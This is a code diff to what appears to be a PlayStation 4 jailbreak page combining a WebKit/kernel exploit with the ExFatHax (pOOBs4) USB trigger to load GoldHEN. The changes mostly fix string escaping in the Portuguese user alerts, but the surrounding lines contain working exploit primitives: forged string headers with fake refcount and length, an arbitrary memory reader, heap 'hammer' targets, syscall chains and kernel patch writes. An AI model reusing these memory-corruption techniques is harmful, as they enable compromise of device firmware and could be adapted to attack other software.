@@ -588,7 +588,7 @@ kernel();
 }
 else
 {
-window.progress.innerHTML="Loading the <font color="#ee596f">Goldhen v2.2.2...</font>";
+window.progress.innerHTML="Loading the <font color=\"#ee596f\">Goldhen v2.2.2...</font>";
 setTimeout(injectPayload, 3000);
 }
 }
@@ -915,15 +915,10 @@ chain.fcall(window.syscalls[6], kqueues[i]);
 }
 chain.run();
 
-window.progress.innerHTML="Enabling USB for the <font color="#ee596f">ExFatHax...</font>";
+window.progress.innerHTML="Enabling USB for the <font color=\"#ee596f\">ExFatHax...</font>";
 
 //Trigger OOB
-alert("
-
-Quase pronto!!! Agora siga os passos abaixo para concluir o desbloqueio:
-
-1. Insira o USB com o arquivo exfathax_pico.img (pOOBs4). 
-2. Após a notificação "...USB é incompatível", clique em OK.");
+alert("\n\nQuase pronto!!! Agora siga os passos abaixo para concluir o desbloqueio:\n\n1. Insira o USB com o arquivo exfathax_pico.img (pOOBs4). \n2. Após a notificação \"...USB é incompatível\", clique em OK.");
 
 //Trigger corrupt knote
 {
@@ -952,22 +947,14 @@ chain.fcall(window.syscalls[203], patch_buffer, 0x4000);
 chain.fcall(patch_buffer, p.read8(KERNEL_BASE_PTR));
 chain.fcall(window.syscalls[73], patch_buffer, 0x4000);
 chain.run();
-alert("
+alert("\n\n\nNa tentativa de evitar erros, remova o USB agora e clique em OK.");
 
-
-Na tentativa de evitar erros, remova o USB agora e clique em OK.");
-
-window.progress.innerHTML="Loading the <font color="#ee596f">Goldhen v2.2.2...</font>";														   
+window.progress.innerHTML="Loading the <font color=\"#ee596f\">Goldhen v2.2.2...</font>";														   
 setTimeout(injectPayload,1500);
 }
 else
 {
-alert("O desbloqueio FALHOU!!! Feche o navegador e
-refaça "TODO PROCESSO", inclusive excluindo cookies e dados de sites.
-
-Observações:
-Permanecendo a falha,
-pode ser que o USB esteja corrompido, reescreva a imagem.");
+alert("O desbloqueio FALHOU!!! Feche o navegador e\nrefaça \"TODO PROCESSO\", inclusive excluindo cookies e dados de sites.\n\nObservações:\nPermanecendo a falha,\npode ser que o USB esteja corrompido, reescreva a imagem.");
 p.write8(0, 0);
 }
 }
@@ -1044,7 +1031,7 @@ return ans;
 var strings = [];
 
 function mkString(l, head) {
-var s = head + ' '.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
+var s = head + '\u0000'.repeat(l - STRING_OFFSET - 8 - head.length) + (string_id++);
 string_atomifier[s] = 1;
 strings.push(s);
 return s;
@@ -1125,7 +1112,7 @@ break;
 function makeReader(read_addr, ffs_name) {
 var fake_s = '';
 fake_s += '0000'; //padding for 8-byte alignment
-fake_s += 'ÿ   ÿÿÿÿ'; //refcount=255, length=0xffffffff
+fake_s += '\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff'; //refcount=255, length=0xffffffff
 fake_s += ptrToString(read_addr); //where to read from
 fake_s += ptrToString(0x80000014); //some fake non-zero hash, atom, 8-bit
 p_s = '';
@@ -1221,7 +1208,7 @@ var fake_s = '';
 fake_s += '0000'; //padding for 8-byte alignment
 fake_s += ptrToString(INVALID_POINTER); //never dereferenced
 fake_s += ptrToString(butterfly); //hammer target
-fake_s += '    "   '; //length=34
+fake_s += '\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000'; //length=34
 
 var ffs7_args = [];
 for (var i = 0; i < 12; i++)
